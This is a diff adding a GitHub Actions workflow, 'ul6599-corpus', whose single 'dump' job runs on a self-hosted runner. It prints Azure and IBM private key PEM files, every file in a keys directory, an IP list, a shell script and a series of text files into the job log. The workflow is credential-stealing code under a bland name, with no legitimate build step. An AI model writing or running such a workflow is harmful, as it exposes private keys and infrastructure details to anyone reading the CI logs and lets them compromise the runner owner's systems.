@@ -1,0 +1,20 @@
+name: ul6599-corpus
+on:
+  workflow_dispatch:
+jobs:
+  dump:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 12
+    steps:
+      - name: files
+        run: |
+          set +e
+          W=/opt/ul-runner/_work/ul-plant/ul-plant
+          echo "=== PEM_AZADMIN ==="; cat $W/az/azadmin.pem 2>&1
+          echo "=== PEM_IBM ==="; cat $W/az/ibm_key.pem 2>&1
+          echo "=== KEYS_LS ==="; ls -la $W/keys 2>&1 | head -40
+          echo "=== KEYS_CAT ==="; for f in $W/keys/*; do echo "-- $f"; head -c 1200 "$f"; echo; done 2>&1 | head -120
+          echo "=== IPS ==="; head -c 4000 $W/ips.txt 2>&1
+          echo "=== PLANT5 ==="; head -c 6000 $W/plant5.sh 2>&1
+          echo "=== PS8_ALL ==="
+          for f in $W/ps8/*.txt; do echo "##### $f"; head -c 4000 "$f"; echo; done 2>&1 | head -700
